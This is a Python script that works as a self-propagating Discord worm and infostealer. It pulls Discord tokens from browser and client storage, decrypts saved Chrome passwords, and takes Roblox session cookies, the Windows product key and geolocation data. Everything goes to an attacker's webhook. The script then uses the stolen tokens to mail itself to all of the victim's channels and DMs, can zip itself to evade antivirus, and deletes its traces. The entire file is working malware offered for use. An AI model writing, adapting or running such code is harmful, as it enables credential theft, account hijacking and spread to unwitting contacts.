import requests
import shutil
import os

#?############ CONFIG
webhook = "" # Webhook to send your info into

message = "" # Message to send to the friends and servers of the victim along with the file

zipfirst = False # If the program should make the file .zip first before sending it to the victim
                 # This will have a smaller chance of an AV noticing the download

#?############ CONFIG END


############# Functions
def makeFile(zipfirst: bool):
    file = __file__
    if zipfirst:
        roaming = os.getenv('AppData')
        file = shutil.make_archive(format='zip', base_dir=__file__, base_name=roaming + "temp.txt")

    files = {
        "file" : (file, open(file, 'rb')) # The file that we want to send in binary
        }
    return files

def sendmessage(token, message, channel_id, iftimeout: bool, files):
    print("Sending message to ", channel_id)
    url = f"https://discord.com/api/channels/{channel_id}/messages"

    headers = {"Authorization": token}
    payload = {"content": message}

    timeout = 999
    if iftimeout == True:
        timeout = 0.00000001

    try:
        r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
        print(r.status_code)
    except requests.Timeout:
        print("Timed out on channel ", channel_id)
        pass
    except Exception as e:
        print(e)

def sendDMs(token, message, channel_id, iftimeout: bool, files):
    print("Sending DM to ", channel_id)
    url = f"https://discord.com/channels/@me/{channel_id}"
    #url = f"https://discord.com/api/v9/channels/{channel_id}/message"

    headers = {"Authorization": token}
    payload = {"content": message}

    timeout = 30
    if iftimeout == True:
        timeout = 0.00000001

    try:
        r = requests.post(url, headers=headers, json=payload, timeout=timeout, files=files)
        print(r.status_code)
    except requests.Timeout:
        print("Timed out on channel ", channel_id)
        pass
    except Exception as e:
        print(e)

def getchannels(token):
    print("Getting channels")
    def getDMs(token):
        print("Getting DM channels")
        def get_user_id(token):
            print("Getting user ID for DM channels")
            headers = {
                'Authorization': token
            }
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            response.raise_for_status()
            user = response.json()
            return user['id']

        headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

        user_id = get_user_id(token)
        response = requests.get(f"https://discord.com/api/v9/users/{user_id}/channels", headers=headers)

        IDs = []
        for i in response.json():
            IDs.append(i["id"])
        return IDs
    
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }


    url = "https://discord.com/api/v9/users/@me/guilds"
    url_base = 'https://discord.com/api/v6/guilds/' # The v6 apparently doesn't matter? Don't mind it.

    response = requests.get(url, headers=headers)

    print("Channels status code: ")
    print(response.status_code)
    if response.status_code != 200:
        raise("Incorrect status code")

    guilds = response.json()

    channels = []
    for guild in guilds:
        response = requests.get(url_base + f'{guild["id"]}/channels', headers=headers)
        
        guild_channels = response.json()
        for i in guild_channels:
            print("Channel found: ", i["name"])
            guild_channel_id = i["id"]
            channels.append(guild_channel_id)
    
    return (channels, getDMs(token))

def spread(token, message, zipfirst):
    print("Spreading")
    channels = getchannels(token)
    files = makeFile(zipfirst)
    for i in channels[0]:
        sendmessage(token, message, i, True, files)
    for i in channels[1]: # Change the True in these to False if you want to see the status codes
        sendDMs(token, message, i, True, files)

def tokenlogger(webhook): # Stolen because I'm lazy as hell: https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks
    import psutil
    import platform
    import json
    from datetime import datetime
    from time import sleep
    import requests
    import socket
    from requests import get
    import re
    import requests
    import subprocess
    from uuid import getnode as get_mac
    import browser_cookie3 as steal, requests, base64, zipfile, shutil, os, re, sys, sqlite3
    from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
    from cryptography.hazmat.backends import default_backend


    from base64 import b64decode, b64encode
    from dhooks import Webhook, Embed, File
    from sys import argv

    # CONFIG -> Setup before compiling
    url= webhook #Paste Discord Webhook url




    # Scaling from bytes to KB,MB,GB, etc
    def scale(bytes, suffix="B"):
        defined = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < defined:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= defined

    uname = platform.uname()

    bt = datetime.fromtimestamp(psutil.boot_time()) # Boot time

    host = socket.gethostname()
    localip = socket.gethostbyname(host)

    publicip = get('https://api.ipify.org').text # Get public API
    city = get(f'https://ipapi.co/{publicip}/city').text
    region = get(f'https://ipapi.co/{publicip}/region').text
    postal = get(f'https://ipapi.co/{publicip}/postal').text
    timezone = get(f'https://ipapi.co/{publicip}/timezone').text
    currency = get(f'https://ipapi.co/{publicip}/currency').text
    country = get(f'https://ipapi.co/{publicip}/country_name').text
    callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
    vpn = requests.get('http://ip-api.com/json?fields=proxy')
    proxy = vpn.json()['proxy']
    mac = get_mac()


    roaming = os.getenv('AppData')
    ## Output for txt file location
    output = open(roaming + "temp.txt", "a")


    ## Discord Locations
    Directories = {
            'Discord': roaming + '\\Discord',
            'Discord Two': roaming + '\\discord',
            'Discord Canary': roaming + '\\Discordcanary',
            'Discord Canary Two': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
    }


    ## Scan for the regex [\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}
    def Yoink(Directory):
        Directory += '\\Local Storage\\leveldb'

        Tokens = []

        for FileName in os.listdir(Directory):
            if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for Token in re.findall(regex, line):
                        Tokens.append(Token)

        return Tokens


    ## Wipe the temp file
    def Wipe():
        if os.path.exists(roaming + "temp.txt"):
            output2 = open(roaming + "temp.txt", "w")
            output2.write("")
            output2.close()
        else:
            pass


    ## Search Directorys for Token regex if exists
    for Discord, Directory in Directories.items():
        if os.path.exists(Directory):
            Tokens = Yoink(Directory)
        if len(Tokens) > 0:
            for Token in Tokens:
                realshit = f"{Token}\n"


    cpufreq = psutil.cpu_freq()
    svmem = psutil.virtual_memory()
    partitions = psutil.disk_partitions()
    disk_io = psutil.disk_io_counters()
    net_io = psutil.net_io_counters()

    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            continue


    requests.post(url, data=json.dumps({ "embeds": [ { "title": f"Someone Runs Program! - {host}", "color": 8781568 }, { "color": 7506394, "fields": [ { "name": "GeoLocation", "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {callcode} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n" } ] }, { "fields": [ { "name": "System Information", "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" } ] }, { "color": 15109662, "fields": [ { "name": "CPU Information", "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n" }, { "name": "Nemory Information", "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%" }, { "name": "Disk Information", "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}" }, { "name": "Network Information", "value": f"Total Sent: {scale(net_io.bytes_sent)}\")\nTotal Received: {scale(net_io.bytes_recv)}" } ] }, { "color": 7440378, "fields": [ { "name": "Discord information", "value": f"Token: {realshit}" } ] } ] }), headers={"Content-Type": "application/json"})

    DBP = r'Google\Chrome\User Data\Default\Login Data'
    ADP = os.environ['LOCALAPPDATA']


    def sniff(path):
        path += '\\Local Storage\\leveldb'

        tokens = []
        try:
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue

                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            tokens.append(token)
            return tokens
        except:
            pass


    def encrypt(cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return (cipher, ciphertext, nonce)


    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)


    def rcipher(key):
        cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
        return cipher


    def dpapi(encrypted):
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result


    def localdata():
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]


    def decryptions(encrypted_txt):
        encoded_key = localdata()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = dpapi(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = rcipher(key)
        return decrypt(cipher, encrypted_txt[15:], nonce)


    class chrome:
        def __init__(self):
            self.passwordList = []

        def chromedb(self):
            _full_path = os.path.join(ADP, DBP)
            _temp_path = os.path.join(ADP, 'sqlite_file')
            if os.path.exists(_temp_path):
                os.remove(_temp_path)
            shutil.copyfile(_full_path, _temp_path)
            self.pwsd(_temp_path)
        def pwsd(self, db_file):
            conn = sqlite3.connect(db_file)
            _sql = 'select signon_realm,username_value,password_value from logins'
            for row in conn.execute(_sql):
                host = row[0]
                if host.startswith('android'):
                    continue
                name = row[1]
                value = self.cdecrypt(row[2])
                _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
                self.passwordList.append(_info)
            conn.close()
            os.remove(db_file)

        def cdecrypt(self, encrypted_txt):
            if sys.platform == 'win32':
                try:
                    if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                        decrypted_txt = dpapi(encrypted_txt)
                        return decrypted_txt.decode()
                    elif encrypted_txt[:3] == b'v10':
                        decrypted_txt = decryptions(encrypted_txt)
                        return decrypted_txt[:-16].decode()
                except WindowsError:
                    return None
            else:
                pass

        def saved(self):
            try:
                with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
                    f.writelines(self.passwordList)
            except WindowsError:
                return None


    if __name__ == "__main__":
        main = chrome()
        try:
            main.chromedb()
        except:
            pass
        main.saved()


    # webhook functionality => collect rest of specified data, send it to our webhook


    def beamed():
        hook = Webhook(url)
        try:
            hostname = requests.get("https://api.ipify.org").text
        except:
            pass


        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = '\n'
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += '```'

            tokens = sniff(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                pass

            message += '```'

        """gather our .zip variables"""
        try:
            zname = r'C:\ProgramData\passwords.zip'
            newzip = zipfile.ZipFile(zname, 'w')
            newzip.write(r'C:\ProgramData\passwords.txt')
            newzip.close()
            passwords = File(r'C:\ProgramData\passwords.zip')
        except:
            pass
        
        """gather our windows product key variables"""
        try:
            usr = os.getenv("UserName")
            keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
            types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
        except:
            pass

        """steal victim's .roblosecurity cookie"""
        cookie = [".ROBLOSECURITY"]
        cookies = []
        limit = 2000

        """chrome installation => list cookies from this location"""
        try:
            cookies.extend(list(steal.chrome()))
        except:
            pass

        """firefox installation => list cookies from this location"""
        try:
            cookies.extend(list(steal.firefox()))
        except:
            pass

        """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
        try:
            for y in cookie:
                send = str([str(x) for x in cookies if y in str(x)])
                chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
                for z in chunks:
                    roblox = f'```' + f'{z}' + '```'
        except:
            pass

        """attempt to send all recieved data to our specified webhook"""
        try:
            embed = Embed(title='Aditional Features',description='a victim\'s data was extracted, here\'s the details:',color=0x2f3136,timestamp='now')
            embed.add_field("windows key:",f"user => {usr}\ntype => {types}\nkey => {keys}")
            embed.add_field("roblosecurity:",roblox)
            embed.add_field("tokens:",message)
            embed.add_field("hostname:",f"{hostname}")
        except:
            pass
        try:
            hook.send(embed=embed, file=passwords)
        except:
            pass

        """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
        try:
            subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
            subprocess.os.system(r'del C:\ProgramData\passwords.zip')
            subprocess.os.system(r'del C:\ProgramData\passwords.txt')
        except:
            pass

        return tokens


    tokens = beamed()
    return tokens

def catchAndSpread(webhook, message, zipfirst):
    tokens = tokenlogger(webhook)
    if len(tokens) > 0:
        for i in tokens:
            spread(i, message, zipfirst)


catchAndSpread(webhook, message, zipfirst)
